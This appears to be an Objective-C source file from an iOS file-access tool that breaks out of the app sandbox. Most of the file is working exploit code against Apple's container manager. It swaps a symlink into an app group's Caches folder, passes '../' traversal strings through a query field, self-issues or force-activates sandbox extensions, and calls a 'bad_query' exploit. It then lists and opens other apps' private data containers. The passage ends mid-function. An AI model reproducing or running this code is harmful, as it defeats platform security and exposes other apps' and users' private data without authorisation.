#import "ContainerEngine.h"
#import "kexploit/bad_query.h"
#import "kexploit/sandbox_escape.h"
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <stdlib.h>
#import <unistd.h>
#import <xpc/xpc.h>
#import <fcntl.h>
#import <os/lock.h>
#import <dirent.h>
#import <sys/stat.h>
#import <errno.h>

#pragma mark - containermanager C API types

typedef void *(*MCMQueryCreate_t)(void);
typedef void  (*MCMQuerySetU64_t)(void *, uint64_t);
typedef void  (*MCMQuerySetXPC_t)(void *, xpc_object_t);
typedef void  (*MCMQuerySetCString_t)(void *, const char *);
typedef void *(*MCMQueryGetSingle_t)(void *);
typedef void *(*MCMQueryGetError_t)(void *);
typedef bool  (*MCMQueryIterate_t)(void *, bool (^)(void *));
typedef void  (*MCMQueryFree_t)(void *);
typedef const char *(*MCMObjectGetPath_t)(void *);
typedef const char *(*MCMObjectGetIdentifier_t)(void *);
typedef void *(*MCMObjectCopy_t)(void *);
typedef char *(*MCMObjectCopyToken_t)(void *);
typedef bool  (*MCMObjectActivate_t)(void *, bool);
typedef void  (*MCMObjectFree_t)(void *);
typedef int   (*MCMErrorGetPOSIX_t)(void *);
typedef const char *(*MCMErrorGetMessage_t)(void *);

typedef struct {
    void *handle;
    MCMQueryCreate_t    queryCreate;
    MCMQuerySetU64_t    querySetClass;
    MCMQuerySetXPC_t    querySetIdentifiers;
    MCMQuerySetXPC_t    querySetGroupIdentifiers;
    MCMQuerySetU64_t    querySetFlags;
    MCMQuerySetU64_t    querySetPart;
    MCMQuerySetCString_t querySetPartDomain;
    MCMQueryGetSingle_t queryGetSingle;
    MCMQueryGetError_t  queryGetLastError;
    MCMQueryIterate_t   queryIterate;
    MCMQueryFree_t      queryFree;
    MCMObjectGetPath_t  objectGetPath;
    MCMObjectGetIdentifier_t objectGetIdentifier;
    MCMObjectCopy_t     objectCopy;
    MCMObjectCopyToken_t objectCopyToken;
    MCMObjectActivate_t objectActivate;
    MCMObjectFree_t     objectFree;
    MCMErrorGetPOSIX_t  errorGetPOSIX;
    MCMErrorGetMessage_t errorGetMessage;
} MCMAPI;

static MCMAPI *FDGetAPI(void) {
    static MCMAPI api;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        api.handle = dlopen("/usr/lib/system/libsystem_containermanager.dylib",
                            RTLD_NOW | RTLD_LOCAL);
        void *h = api.handle ? api.handle : RTLD_DEFAULT;
#define LOAD(f, sym) api.f = (__typeof(api.f))dlsym(h, sym)
        LOAD(queryCreate,             "container_query_create");
        LOAD(querySetClass,           "container_query_set_class");
        LOAD(querySetIdentifiers,     "container_query_set_identifiers");
        LOAD(querySetGroupIdentifiers,"container_query_set_group_identifiers");
        LOAD(querySetFlags,           "container_query_operation_set_flags");
        LOAD(querySetPart,            "container_query_operation_set_part");
        LOAD(querySetPartDomain,      "container_query_operation_set_part_domain");
        LOAD(queryGetSingle,          "container_query_get_single_result");
        LOAD(queryGetLastError,       "container_query_get_last_error");
        LOAD(queryIterate,            "container_query_iterate_results_sync");
        LOAD(queryFree,               "container_query_free");
        LOAD(objectGetPath,           "container_object_get_path");
        LOAD(objectGetIdentifier,     "container_object_get_identifier");
        LOAD(objectCopy,              "container_object_copy");
        LOAD(objectCopyToken,         "container_copy_sandbox_token");
        LOAD(objectActivate,          "container_object_sandbox_extension_activate");
        LOAD(objectFree,              "container_object_free");
        LOAD(errorGetPOSIX,           "container_error_get_posix_errno");
        LOAD(errorGetMessage,         "container_error_get_message");
#undef LOAD
    });
    return &api;
}

#pragma mark - Lease storage

typedef struct {
    void *query;
    void *activation;
    char  identifier[256];
    char  path[1024];
    bool  active;
} FDLease;

#define MAX_LEASES 16
static FDLease sLeases[MAX_LEASES];
static os_unfair_lock sLeaseLock = OS_UNFAIR_LOCK_INIT;

static FDLease *_findLease(const char *identifier) {
    for (int i = 0; i < MAX_LEASES; i++) {
        if (sLeases[i].active && strcmp(sLeases[i].identifier, identifier) == 0)
            return &sLeases[i];
    }
    return NULL;
}

static FDLease *_allocLease(void) {
    for (int i = 0; i < MAX_LEASES; i++) {
        if (!sLeases[i].active) return &sLeases[i];
    }
    return &sLeases[0];
}

static void _storeLease(MCMAPI *api, void *q, void *act, const char *ident, const char *path) {
    os_unfair_lock_lock(&sLeaseLock);
    FDLease *lease = _allocLease();
    if (lease->active && lease->query) {
        if (lease->activation && api->objectFree) api->objectFree(lease->activation);
        api->queryFree(lease->query);
    }
    lease->query = q;
    lease->activation = act;
    strlcpy(lease->identifier, ident, sizeof(lease->identifier));
    strlcpy(lease->path, path, sizeof(lease->path));
    lease->active = true;
    os_unfair_lock_unlock(&sLeaseLock);
}

#pragma mark - Logging / diagnostics

static char sDiag[8192] = "";
static int  sDiagLen = 0;

static void _diagReset(void) { sDiag[0] = '\0'; sDiagLen = 0; }
static void _diagAppend(const char *fmt, ...) __attribute__((format(printf, 1, 2)));
static void _diagAppend(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    int remaining = (int)sizeof(sDiag) - sDiagLen - 1;
    if (remaining > 0) {
        int n = vsnprintf(sDiag + sDiagLen, remaining, fmt, ap);
        if (n > 0) sDiagLen += (n < remaining ? n : remaining);
    }
    va_end(ap);
}

static inline void FDLog(NSString *msg) {
    NSLog(@"[FileDavizin] %@", msg);
}

#pragma mark - Runtime app group discovery

static const char *kAppGroupsFallback[] = {
    "group.a8b3cf4e91d07562.1",
    "group.a8b3cf4e91d07562.2",
    "group.a8b3cf4e91d07562.3",
};
static const int kAppGroupCountFallback = 3;

static void _getRuntimeAppGroups(const char ***outGroups, int *outCount) {
    static const char **sGroups = NULL;
    static int sCount = 0;
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        NSArray<NSString *> *discovered = nil;

        // Method 1: SecTask entitlements
        typedef void *(*SecTaskCreateFromSelfFunc)(CFAllocatorRef);
        typedef CFTypeRef (*SecTaskCopyEntFunc)(void *, CFStringRef, CFErrorRef *);
        SecTaskCreateFromSelfFunc createSelf = (SecTaskCreateFromSelfFunc)
            dlsym(RTLD_DEFAULT, "SecTaskCreateFromSelf");
        SecTaskCopyEntFunc copyEnt = (SecTaskCopyEntFunc)
            dlsym(RTLD_DEFAULT, "SecTaskCopyValueForEntitlement");
        if (createSelf && copyEnt) {
            void *task = createSelf(kCFAllocatorDefault);
            if (task) {
                CFTypeRef val = copyEnt(task,
                    CFSTR("com.apple.security.application-groups"), NULL);
                if (val && CFGetTypeID(val) == CFArrayGetTypeID()) {
                    NSArray *arr = (__bridge NSArray *)val;
                    if (arr.count > 0) discovered = [arr copy];
                }
                if (val) CFRelease(val);
                CFRelease(task);
            }
        }

        // Method 2: enumerate class-7 via containermanagerd
        if (!discovered.count) {
            MCMAPI *api = FDGetAPI();
            if (api->queryCreate && api->queryIterate && api->objectGetIdentifier) {
                void *query = api->queryCreate();
                if (query) {
                    api->querySetClass(query, 7);
                    api->querySetFlags(query, 0x100000000ULL);
                    if (api->querySetPart) api->querySetPart(query, 0);
                    NSMutableArray *arr = [NSMutableArray array];
                    api->queryIterate(query, ^bool(void *obj) {
                        const char *ident = obj ? api->objectGetIdentifier(obj) : NULL;
                        if (ident) [arr addObject:[NSString stringWithUTF8String:ident]];
                        return arr.count < 20;
                    });
                    api->queryFree(query);
                    if (arr.count > 0) discovered = [arr copy];
                }
            }
        }

        // Method 3: hardcoded fallback
        if (!discovered.count) {
            NSMutableArray *fb = [NSMutableArray arrayWithCapacity:kAppGroupCountFallback];
            for (int i = 0; i < kAppGroupCountFallback; i++)
                [fb addObject:[NSString stringWithUTF8String:kAppGroupsFallback[i]]];
            discovered = fb;
            NSLog(@"[FD] WARNING: using hardcoded app groups (runtime discovery failed)");
        }

        sCount = (int)discovered.count;
        sGroups = (const char **)calloc(sCount + 1, sizeof(char *));
        for (int i = 0; i < sCount; i++)
            sGroups[i] = strdup(((NSString *)discovered[i]).UTF8String);
    });
    *outGroups = sGroups;
    *outCount = sCount;
}

#pragma mark - worse_query symlink (primary sandbox escape for iOS 27+)

typedef int64_t (*SBXExtConsumeFunc)(const char *);
typedef int (*SBXExtReleaseFunc)(int64_t);

static int64_t _worseQuerySymlink(const char *targetPath) {
    @autoreleasepool {
        if (!targetPath || targetPath[0] != '/') return -1;

        MCMAPI *api = FDGetAPI();
        if (!api->queryCreate || !api->querySetGroupIdentifiers || !api->querySetFlags) {
            return -2;
        }

        SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                                 "sandbox_extension_consume");
        if (!consumeExt) return -2;

        static const uint64_t kFlagSets[] = {
            0x8100000000ULL,
            0x900000000ULL,
            0x8000000000ULL,
            0x800000000ULL,
        };
        static const int kFlagCount = 4;
        static int sKnownGoodFlag = -1;
        static int sKnownGoodGroup = -1;

        SBXExtReleaseFunc releaseExt = (SBXExtReleaseFunc)dlsym(RTLD_DEFAULT,
                                                                 "sandbox_extension_release");
        NSFileManager *fm = [NSFileManager defaultManager];

        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);

        for (int rawG = 0; rawG < rtGroupCount; rawG++) {
            int g = (sKnownGoodGroup >= 0 && rawG == 0) ? sKnownGoodGroup
                  : (sKnownGoodGroup >= 0 && rawG <= sKnownGoodGroup) ? rawG - 1
                  : rawG;
            NSString *groupID = [NSString stringWithUTF8String:rtGroups[g]];
            NSURL *containerURL = [fm containerURLForSecurityApplicationGroupIdentifier:groupID];
            if (!containerURL) {
                NSLog(@"[FD-SYM] no container for group %@ (g=%d)", groupID, g);
                continue;
            }

            NSString *libraryPath = [containerURL.path
                                     stringByAppendingPathComponent:@"Library"];
            int libraryFd = open(libraryPath.fileSystemRepresentation,
                                 O_RDONLY | O_DIRECTORY | O_CLOEXEC);
            if (libraryFd < 0) {
                NSLog(@"[FD-SYM] cannot open Library fd g[%d] errno=%d", g, errno);
                continue;
            }

            for (int oi = 0; oi < kFlagCount; oi++) {
                int fi;
                if (sKnownGoodFlag >= 0) {
                    if (oi == 0) fi = sKnownGoodFlag;
                    else if (oi <= sKnownGoodFlag) fi = oi - 1;
                    else fi = oi;
                } else {
                    fi = oi;
                }

                struct stat cst;
                if (fstatat(libraryFd, "Caches", &cst, AT_SYMLINK_NOFOLLOW) == 0) {
                    if (S_ISDIR(cst.st_mode)) {
                        NSString *cachesPath = [libraryPath
                            stringByAppendingPathComponent:@"Caches"];
                        [fm removeItemAtPath:cachesPath error:nil];
                    } else {
                        unlinkat(libraryFd, "Caches", 0);
                    }
                }

                if (symlinkat(targetPath, libraryFd, "Caches") != 0) {
                    mkdirat(libraryFd, "Caches", 0755);
                    continue;
                }

                void *q = api->queryCreate();
                if (!q) {
                    unlinkat(libraryFd, "Caches", 0);
                    mkdirat(libraryFd, "Caches", 0755);
                    continue;
                }

                api->querySetClass(q, 7);
                xpc_object_t xid = xpc_string_create(rtGroups[g]);
                api->querySetGroupIdentifiers(q, xid);
                api->querySetFlags(q, kFlagSets[fi]);
                if (api->querySetPart) api->querySetPart(q, 3);

                void *res = api->queryGetSingle(q);
                int64_t handle = -6;

                if (res) {
                    char *token = api->objectCopyToken ? api->objectCopyToken(res) : NULL;
                    if (token && token[0]) {
                        handle = consumeExt(token);
                        NSLog(@"[FD-SYM] g[%d] f=%d handle=%lld target=%s",
                              g, fi, (long long)handle, targetPath);
                    } else {
                        NSLog(@"[FD-SYM] g[%d] f=%d no token target=%s", g, fi, targetPath);
                    }
                    free(token);
                } else {
                    void *qErr = api->queryGetLastError ? api->queryGetLastError(q) : NULL;
                    int posix = qErr && api->errorGetPOSIX ? api->errorGetPOSIX(qErr) : 0;
                    NSLog(@"[FD-SYM] g[%d] f=%d NULL posix=%d target=%s",
                          g, fi, posix, targetPath);
                }

                unlinkat(libraryFd, "Caches", 0);
                mkdirat(libraryFd, "Caches", 0755);
                xpc_release(xid);
                api->queryFree(q);

                if (handle >= 0) {
                    int fd = open(targetPath, O_RDONLY | O_CLOEXEC);
                    if (fd >= 0) {
                        close(fd);
                        sKnownGoodFlag = fi;
                        sKnownGoodGroup = g;
                        FDLog([NSString stringWithFormat:
                            @"WQ-SYM success g[%d] f=%d → %s", g, fi, targetPath]);
                        close(libraryFd);
                        return handle;
                    }
                    NSLog(@"[FD-SYM] g[%d] f=%d handle=%lld but open errno=%d %s",
                          g, fi, (long long)handle, errno, targetPath);
                    if (releaseExt) releaseExt(handle);
                }
            }

            close(libraryFd);
        }

        return -1;
    }
}

#pragma mark - worse_query partDomain traversal (fallback)

static const uint64_t kRWPartFlags = 0x8100000000ULL;

typedef struct {
    uint64_t cls;
    const char *identifier;
    bool group;
    uint64_t part;
    int depth;
    const char *label;
} FDAnchor;

static const FDAnchor kAnchors[] = {
    { 12, "com.apple.geod",                              false, 3, 6, "C12-geod" },
    { 13, "systemgroup.com.apple.mobilegestaltcache",     true,  3, 6, "C13-gestalt" },
    { 13, "systemgroup.com.apple.installcoordinationd",   true,  3, 6, "C13-install" },
    { 12, "com.apple.eligibilityd",                       false, 3, 6, "C12-eligib" },
    { 13, "systemgroup.com.apple.configurationprofiles",  true,  0, 4, "C13-config" },
    { 10, "com.apple.swcd",                               false, 0, 4, "C10-swcd" },
    { 10, "com.apple.lsd",                                false, 0, 4, "C10-lsd" },
    { 15, "com.apple.appmanagedfeaturesd",                false, 0, 4, "C15-appman" },
};
static const int kAnchorCount = sizeof(kAnchors) / sizeof(kAnchors[0]);

static int64_t _worseQueryGrant(const char *targetPath, const char *leaseLabel) {
    MCMAPI *api = FDGetAPI();
    if (!api->queryCreate || !api->querySetPartDomain || !api->queryGetSingle ||
        !api->objectCopy || !api->objectActivate)
        return -1;

    const char *relPath = NULL;
    if (strncmp(targetPath, "/private/var/", 13) == 0)
        relPath = targetPath + 13;
    else if (strncmp(targetPath, "/var/", 5) == 0)
        relPath = targetPath + 5;
    else
        return -1;

    for (int i = 0; i < kAnchorCount; i++) {
        const FDAnchor *a = &kAnchors[i];

        char domain[2048];
        domain[0] = '\0';
        for (int d = 0; d < a->depth; d++) {
            if (d == 0) strlcat(domain, "..", sizeof(domain));
            else strlcat(domain, "/..", sizeof(domain));
        }
        strlcat(domain, "/", sizeof(domain));
        strlcat(domain, relPath, sizeof(domain));

        void *q = api->queryCreate();
        if (!q) continue;

        api->querySetClass(q, a->cls);
        xpc_object_t xid = xpc_string_create(a->identifier);
        if (a->group && api->querySetGroupIdentifiers)
            api->querySetGroupIdentifiers(q, xid);
        else
            api->querySetIdentifiers(q, xid);
        api->querySetFlags(q, kRWPartFlags);
        if (api->querySetPart) api->querySetPart(q, a->part);
        api->querySetPartDomain(q, domain);

        void *res = api->queryGetSingle(q);
        if (res) {
            void *act = api->objectCopy(res);
            if (act) {
                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                bool hasToken = token && token[0] != '\0';
                bool activated = hasToken && api->objectActivate(act, false);
                free(token);

                int fd = open(targetPath, O_RDONLY | O_DIRECTORY | O_CLOEXEC);
                if (fd >= 0) {
                    close(fd);
                    FDLog([NSString stringWithFormat:
                        @"WQ %s tok=%d act=%d → open OK for %s",
                        a->label, hasToken, activated, targetPath]);
                    _storeLease(api, q, act, leaseLabel ?: a->identifier, targetPath);
                    xpc_release(xid);
                    return 9100 + i;
                }
                if (api->objectFree) api->objectFree(act);
            }
        }

        xpc_release(xid);
        api->queryFree(q);
    }

    return -1;
}

#pragma mark - FDGrantAccess

typedef char *(*SandboxIssueFileFunc)(const char *, const char *, uint32_t);
typedef char *(*SandboxIssueFilePidFunc)(const char *, const char *, uint32_t, pid_t);
typedef int   (*SandboxCheckFunc)(pid_t, const char *, int, ...);
#define SANDBOX_FILTER_PATH 1

int64_t FDGrantAccess(const char *path) {
    if (!path || path[0] != '/') return -1;

    _diagReset();
    _diagAppend("grant target=%s | ", path);

    NSString *cleanPath = [NSString stringWithUTF8String:path];
    if ([cleanPath hasSuffix:@"/"]) {
        cleanPath = [cleanPath substringToIndex:cleanPath.length - 1];
    }
    const char *pathC = cleanPath.UTF8String;

    MCMAPI *api = FDGetAPI();
    SBXExtConsumeFunc consumeExt = (SBXExtConsumeFunc)dlsym(RTLD_DEFAULT,
                                                             "sandbox_extension_consume");
    SBXExtReleaseFunc releaseExt = (SBXExtReleaseFunc)dlsym(RTLD_DEFAULT,
                                                             "sandbox_extension_release");

    // Pre-check: is path already accessible?
    {
        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
        if (fd >= 0) {
            close(fd);
            _diagAppend("ALREADY_OPEN | ");
            return 9999;
        }
    }

    // Strategy 1: WQ-SYM (primary for iOS 27+)
    {
        int64_t h = _worseQuerySymlink(pathC);
        if (h >= 0) {
            _diagAppend("WQ-SYM OK h=%lld", (long long)h);
            return h;
        }
        _diagAppend("WQ-SYM fail | ");
    }

    // Strategy 2: WQ partDomain traversal
    {
        int64_t h = _worseQueryGrant(pathC, "fd-grant");
        if (h >= 0) {
            _diagAppend("WQ-PD OK h=%lld", (long long)h);
            return h;
        }
        _diagAppend("WQ-PD fail | ");
    }

    // Strategy 3: sandbox_extension_issue_file (self-issued extension)
    {
        SandboxIssueFileFunc issueFile = (SandboxIssueFileFunc)dlsym(RTLD_DEFAULT,
                                                                      "sandbox_extension_issue_file");
        SandboxIssueFilePidFunc issueFilePid = (SandboxIssueFilePidFunc)dlsym(RTLD_DEFAULT,
            "sandbox_extension_issue_file_to_process_by_pid");

        static const char *kExtClasses[] = {
            "com.apple.app-sandbox.read-write",
            "com.apple.app-sandbox.read",
            "com.apple.sandbox.container",
            "com.apple.security.exception.files.absolute-path.read-write",
        };
        int nClasses = sizeof(kExtClasses) / sizeof(kExtClasses[0]);

        for (int ci = 0; ci < nClasses; ci++) {
            if (issueFile && consumeExt) {
                char *token = issueFile(kExtClasses[ci], pathC, 0);
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0) {
                        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                        if (fd >= 0) {
                            close(fd);
                            _diagAppend("ISSUE_FILE[%d] OK h=%lld", ci, (long long)h);
                            free(token);
                            return h;
                        }
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
            if (issueFilePid && consumeExt) {
                char *token = issueFilePid(kExtClasses[ci], pathC, 0, getpid());
                if (token) {
                    int64_t h = consumeExt(token);
                    if (h >= 0) {
                        int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                        if (fd >= 0) {
                            close(fd);
                            _diagAppend("ISSUE_PID[%d] OK h=%lld", ci, (long long)h);
                            free(token);
                            return h;
                        }
                    }
                    if (h >= 0 && releaseExt) releaseExt(h);
                    free(token);
                }
            }
        }
        _diagAppend("ISSUE fail | ");
    }

    // Strategy 4: MCM class-7 app group activation (with force mode)
    const char **rtGroups; int rtGroupCount;
    _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
    if (api->queryCreate && api->querySetGroupIdentifiers && api->objectActivate) {
        for (int g = 0; g < rtGroupCount; g++) {
            static const uint64_t kGrantFlags[] = { 0x900000000ULL, 0x8100000000ULL };
            for (int fi = 0; fi < 2; fi++) {
                void *q = api->queryCreate();
                if (!q) continue;
                api->querySetClass(q, 7);
                xpc_object_t xid = xpc_string_create(rtGroups[g]);
                api->querySetGroupIdentifiers(q, xid);
                api->querySetFlags(q, kGrantFlags[fi]);
                if (api->querySetPart) api->querySetPart(q, 0);
                void *res = api->queryGetSingle(q);
                if (res && api->objectCopy) {
                    // 6a: activate(false)
                    void *act = api->objectCopy(res);
                    if (act) {
                        char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                        bool activated = false;
                        if (token && token[0] != '\0')
                            activated = api->objectActivate(act, false);
                        free(token);
                        if (activated) {
                            int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                            if (fd >= 0) {
                                close(fd);
                                _storeLease(api, q, act, rtGroups[g], pathC);
                                xpc_release(xid);
                                _diagAppend("MCM-C7 OK g[%d] f=%d", g, fi);
                                return 9000 + g;
                            }
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                    // 6b: activate(true) — force mode
                    act = api->objectCopy(res);
                    if (act) {
                        bool ok = api->objectActivate(act, true);
                        if (ok) {
                            int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                            if (fd >= 0) {
                                close(fd);
                                _storeLease(api, q, act, rtGroups[g], pathC);
                                xpc_release(xid);
                                _diagAppend("MCM-C7-force OK g[%d] f=%d", g, fi);
                                return 9050 + g;
                            }
                        }
                        if (api->objectFree) api->objectFree(act);
                    }
                }
                xpc_release(xid);
                api->queryFree(q);
            }
        }
        _diagAppend("MCM-C7 fail | ");
    }

    // Strategy 5: bad_query class-13
    {
        int64_t h = bad_query((char *)pathC, true, NULL, false);
        if (h >= 0) {
            _diagAppend("BQ-C13 OK h=%lld", (long long)h);
            return h;
        }
        _diagAppend("BQ-C13 fail | ");
    }

    // Strategy 6: bad_query class-7 per app group
    for (int g = 0; g < rtGroupCount; g++) {
        int64_t h = bad_query((char *)pathC, true, (char *)rtGroups[g], false);
        if (h >= 0) {
            _diagAppend("BQ-AG[%d] OK h=%lld", g, (long long)h);
            return h;
        }
        h = bad_query((char *)pathC, false, (char *)rtGroups[g], false);
        if (h >= 0) {
            _diagAppend("BQ-AG[%d]-nc OK h=%lld", g, (long long)h);
            return h;
        }
    }

    // Strategy 7: Direct open() hail mary
    {
        int flags[] = { O_RDONLY, O_RDONLY | O_DIRECTORY, O_RDONLY | O_CLOEXEC };
        for (int i = 0; i < 3; i++) {
            int fd = open(pathC, flags[i]);
            if (fd >= 0) {
                close(fd);
                _diagAppend("HAIL_MARY OK flags=%d", flags[i]);
                return 9900 + i;
            }
        }
    }

    // Strategy 8: Try parent directory then re-check
    {
        NSString *parent = [cleanPath stringByDeletingLastPathComponent];
        if (parent.length > 1) {
            int64_t ph = _worseQuerySymlink(parent.UTF8String);
            if (ph < 0) ph = _worseQueryGrant(parent.UTF8String, "fd-parent");
            if (ph >= 0) {
                int fd = open(pathC, O_RDONLY | O_CLOEXEC);
                if (fd >= 0) {
                    close(fd);
                    _diagAppend("PARENT OK ph=%lld", (long long)ph);
                    return ph;
                }
            }
        }
    }

    _diagAppend("ALL FAILED");
    FDLog([NSString stringWithFormat:@"Grant FAILED for %s", pathC]);
    return -1;
}

void FDReleaseAccess(int64_t handle) {
    if (handle >= 9000) return;
    if (handle >= 0) bad_query_release(handle);
}

#pragma mark - FDCanWrite

BOOL FDCanWrite(const char *dirPath) {
    char canary[1200];
    snprintf(canary, sizeof(canary), "%s/.fd_probe", dirPath);
    FILE *f = fopen(canary, "w");
    if (!f) return NO;
    fprintf(f, "fdprobe");
    fclose(f);
    f = fopen(canary, "r");
    if (!f) { unlink(canary); return NO; }
    char buf[16] = {0};
    fread(buf, 1, 7, f);
    fclose(f);
    unlink(canary);
    return (strcmp(buf, "fdprobe") == 0);
}

#pragma mark - MCM enumeration helpers

static NSString *_queryContainerPath(uint64_t cls, NSString *identifier,
                                     BOOL group, uint64_t flags) {
    MCMAPI *api = FDGetAPI();
    if (!api->queryCreate || !api->queryGetSingle || !api->objectGetPath) return nil;

    void *q = api->queryCreate();
    if (!q) return nil;

    api->querySetClass(q, cls);
    xpc_object_t xid = xpc_string_create(identifier.UTF8String);
    if (group && api->querySetGroupIdentifiers)
        api->querySetGroupIdentifiers(q, xid);
    else
        api->querySetIdentifiers(q, xid);
    api->querySetFlags(q, flags);
    if (api->querySetPart) api->querySetPart(q, 0);

    void *res = api->queryGetSingle(q);
    NSString *path = nil;
    if (res) {
        const char *raw = api->objectGetPath(res);
        if (raw) path = [NSString stringWithUTF8String:raw];
        if (path && ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"]))
            path = [@"/private" stringByAppendingString:path];

        if (api->objectCopy && api->objectActivate) {
            void *act = api->objectCopy(res);
            if (act) {
                char *token = api->objectCopyToken ? api->objectCopyToken(act) : NULL;
                bool activated = false;
                if (token && token[0] != '\0')
                    activated = api->objectActivate(act, false);
                free(token);
                if (activated) {
                    _storeLease(api, q, act, identifier.UTF8String, path.UTF8String ?: "");
                    xpc_release(xid);
                    return path;
                }
                if (api->objectFree) api->objectFree(act);
            }
        }
    }

    api->queryFree(q);
    xpc_release(xid);
    return path;
}

static NSArray<NSString *> *_enumerateIdentifiers(uint64_t cls, NSUInteger limit) {
    MCMAPI *api = FDGetAPI();
    if (!api->queryCreate || !api->queryIterate || !api->objectGetIdentifier || limit == 0)
        return @[];

    void *q = api->queryCreate();
    if (!q) return @[];

    api->querySetClass(q, cls);
    api->querySetFlags(q, 0x100000000ULL);
    if (api->querySetPart) api->querySetPart(q, 0);

    NSMutableOrderedSet<NSString *> *identifiers = [NSMutableOrderedSet orderedSet];
    api->queryIterate(q, ^bool(void *object) {
        const char *raw = object ? api->objectGetIdentifier(object) : NULL;
        NSString *ident = raw ? [NSString stringWithUTF8String:raw] : nil;
        if (ident.length) [identifiers addObject:ident];
        return identifiers.count < limit;
    });

    api->queryFree(q);
    return identifiers.array;
}

#pragma mark - FDEnumerateApps

static NSArray<NSDictionary<NSString *, NSString *> *> *_scanAllContainers(NSUInteger limit) {
    NSMutableArray<NSDictionary<NSString *, NSString *> *> *results = [NSMutableArray array];
    NSMutableSet<NSString *> *seen = [NSMutableSet set];

    static const char *kDataDirs[] = {
        "/private/var/mobile/Containers/Data/Application",
        "/var/mobile/Containers/Data/Application",
    };

    // Grant parent directory ONCE — recursive access covers children
    for (int d = 0; d < 2; d++) {
        int64_t h = _worseQuerySymlink(kDataDirs[d]);
        if (h >= 0) {
            FDLog([NSString stringWithFormat:@"scan: WQ-SYM parent OK h=%lld dir=%s",
                   (long long)h, kDataDirs[d]]);
            break;
        }
        h = _worseQueryGrant(kDataDirs[d], "fd-scan");
        if (h >= 0) {
            FDLog([NSString stringWithFormat:@"scan: WQ-PD parent OK h=%lld dir=%s",
                   (long long)h, kDataDirs[d]]);
            break;
        }
        h = bad_query((char *)kDataDirs[d], true, NULL, false);
        if (h >= 0) {
            FDLog([NSString stringWithFormat:@"scan: BQ parent OK h=%lld dir=%s",
                   (long long)h, kDataDirs[d]]);
            break;
        }
        const char **rtGroups; int rtGroupCount;
        _getRuntimeAppGroups(&rtGroups, &rtGroupCount);
        for (int g = 0; g < rtGroupCount; g++) {
            h = bad_query((char *)kDataDirs[d], true, (char *)rtGroups[g], false);
            if (h >= 0) {
                FDLog([NSString stringWithFormat:@"scan: BQ-AG parent OK dir=%s", kDataDirs[d]]);
                break;
            }
        }
        if (h >= 0) break;
    }

    for (int d = 0; d < 2 && results.count < limit; d++) {
        DIR *dir = opendir(kDataDirs[d]);
        if (!dir) {
            FDLog([NSString stringWithFormat:@"scan: opendir FAILED dir=%s errno=%d",
                   kDataDirs[d], errno]);
            continue;
        }

        FDLog([NSString stringWithFormat:@"scan: opendir OK dir=%s", kDataDirs[d]]);
        int dirCount = 0;
        int plistOK = 0;

        struct dirent *entry;
        while ((entry = readdir(dir)) != NULL && results.count < limit) {
            if (entry->d_name[0] == '.') continue;
            if (entry->d_type != DT_DIR && entry->d_type != DT_UNKNOWN) continue;
            if (strlen(entry->d_name) < 32) continue;
            dirCount++;

            char fullPath[1200];
            snprintf(fullPath, sizeof(fullPath), "%s/%s", kDataDirs[d], entry->d_name);

            char metaPath[1200];
            snprintf(metaPath, sizeof(metaPath),
                     "%s/.com.apple.mobile_container_manager.metadata.plist",
                     fullPath);

            NSDictionary *plist = [NSDictionary dictionaryWithContentsOfFile:
                [NSString stringWithUTF8String:metaPath]];

            NSString *identifier = nil;
            if (plist) {
                plistOK++;
                identifier = plist[@"MCMMetadataIdentifier"];
            }
            if (!identifier.length) {
                identifier = [NSString stringWithUTF8String:entry->d_name];
            }

            if ([seen containsObject:identifier]) continue;
            [seen addObject:identifier];

            NSMutableDictionary *dict = [NSMutableDictionary dictionary];
            dict[@"identifier"] = identifier;
            dict[@"path"] = [NSString stringWithUTF8String:fullPath];
            [results addObject:dict];
        }
        closedir(dir);

        FDLog([NSString stringWithFormat:
            @"scan: dir=%s dirs=%d plist_ok=%d results=%lu",
            kDataDirs[d], dirCount, plistOK, (unsigned long)results.count]);
    }

    FDLog([NSString stringWithFormat:@"Directory scan found %lu containers",
           (unsigned long)results.count]);
    return results;
}

NSArray<NSDictionary<NSString *, NSString *> *> *FDEnumerateApps(NSUInteger limit) {
    NSMutableArray<NSDictionary<NSString *, NSString *> *> *results = [NSMutableArray array];
    NSMutableSet<NSString *> *seen = [NSMutableSet set];

    // Pass 1: MCM class-2 enumeration
    NSArray<NSString *> *identifiers = _enumerateIdentifiers(2, limit);
    FDLog([NSString stringWithFormat:@"MCM enumerated %lu app identifiers",
           (unsigned long)identifiers.count]);

    for (NSString *ident in identifiers) {
        NSString *path = _queryContainerPath(2, ident, NO, 0x900000000ULL);
        if (!path) path = _queryContainerPath(2, ident, NO, 0x8100000000ULL);

        NSMutableDictionary *entry = [NSMutableDictionary dictionary];
        entry[@"identifier"] = ident;
        if (path) entry[@"path"] = path;
        [results addObject:entry];
        [seen addObject:ident];

        if (results.count >= limit) break;
    }

    // Pass 2: Directory scan (always — critical for iOS 27+ where MCM returns empty)
    {
        NSArray *scanned = _scanAllContainers(limit);
        for (NSDictionary *dict in scanned) {
            NSString *ident = dict[@"identifier"];
            if ([seen containsObject:ident]) continue;
            [seen addObject:ident];
            [results addObject:dict];
            if (results.count >= limit) break;
        }
    }

    FDLog([NSString stringWithFormat:@"Total enumerated: %lu containers",
           (unsigned long)results.count]);
    return results;
}

#pragma mark - FDDiscoverContainerPath

static NSString *_scanContainerDir(const char *basePath, NSString *targetBundleID) {
    DIR *dir = opendir(basePath);
    if (!dir) return nil;

    struct dirent *entry;
    while ((entry = readdir(dir)) != NULL) {
